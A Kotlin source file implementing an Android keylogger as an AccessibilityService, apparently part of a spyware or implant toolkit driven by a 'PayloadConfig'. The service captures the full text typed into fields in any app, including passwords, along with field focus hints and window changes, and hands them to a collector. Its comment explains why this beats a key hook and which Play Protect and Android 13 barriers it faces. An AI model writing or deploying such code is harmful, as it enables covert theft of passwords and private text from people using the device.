package com.mobilesvc.agent

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

/**
 * Keystroke capture through an AccessibilityService.
 *
 * This is the real thing, and it is worth being precise about why it works and what it costs.
 *
 * Android does not expose a global key hook to third-party apps — `WH_KEYBOARD_LL` does not
 * exist here. What it does expose is an accessibility service, which receives the *text* of
 * focused views as it changes. That is strictly better than a key hook for a password field:
 * a hook sees `h`, `u`, `n`, `t`, `e`, `r`, `2`; this sees the finished string, because the
 * platform already resolved it.
 *
 * The costs are all real:
 *
 * - The user must enable it in Settings → Accessibility. There is no dialog, no prompt, no
 *   programmatic route. It is one toggle in a list, and Android 13+ puts a persistent warning
 *   banner under it that cannot be dismissed while the service is on.
 * - Play Protect flags accessibility services aggressively; a sideloaded app holding this is
 *   the single strongest malware correlate in published telemetry.
 * - Android 13+ blocks accessibility for apps installed from outside a store by default unless
 *   "Restricted settings" is lifted, which is another Settings detour.
 *
 * So this is gated, reported honestly in the friction panel, and never enabled by default.
 */
class KeyloggerService : AccessibilityService() {

    companion object {
        private const val MAX_EVENT_CHARS = 300
    }

    private var config: PayloadConfig? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        config = PayloadConfig.load(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val config = config ?: PayloadConfig.load(this).also { config = it }
        if (!config.keylog) return

        val source = event ?: return
        val packageName = source.packageName?.toString().orEmpty()

        when (source.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // The full text of the field, not a delta. `event.text` on TEXT_CHANGED carries
                // the current value; `beforeText` is the previous one.
                val text = source.text?.joinToString(" ").orEmpty()
                if (text.isBlank()) return
                Collector.recordKeystroke(
                    "$packageName | ${source.className?.toString()?.substringAfterLast('.')} :: " +
                        text.replace("\n", " ").take(MAX_EVENT_CHARS)
                )
            }

            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                // Field focus is the useful context: it tells the receiver *which* field the
                // next text belongs to. Without it a stream of strings is unreadable.
                val hint = source.contentDescription?.toString()
                    ?: source.text?.joinToString(" ").orEmpty()
                if (hint.isBlank()) return
                Collector.recordKeystroke(
                    "$packageName | focus :: ${hint.replace("\n", " ").take(120)}"
                )
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val title = source.className?.toString()?.substringAfterLast('.') ?: return
                Collector.recordKeystroke("$packageName | window :: $title")
            }
        }
    }

    override fun onInterrupt() = Unit

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        config = null
        return super.onUnbind(intent)
    }
}
